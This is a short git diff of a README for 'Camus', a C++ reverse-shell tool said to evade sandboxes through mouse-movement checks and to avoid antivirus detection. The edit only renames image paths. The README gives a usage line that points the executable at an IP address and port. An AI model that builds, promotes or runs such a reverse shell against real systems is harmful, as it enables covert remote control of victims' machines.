@@ -1,7 +1,7 @@
 # Camus
 
 <div style="text-align: center; ">
-  <img src="Images/1.jpg" width="200">
+  <img src="Image/1.jpg" width="200">
 </div>
 
 Reverse_Shell Implemented in C++ with the ability to bypass sandboxes through detecting mouse movement
@@ -17,4 +17,4 @@ How to Use:
    for example: Camus.exe 192.168.1.1 555
 
 
- <img src="Images/Antiscan.png" width="1000">
+ <img src="Image/Antiscan.png" width="1000">
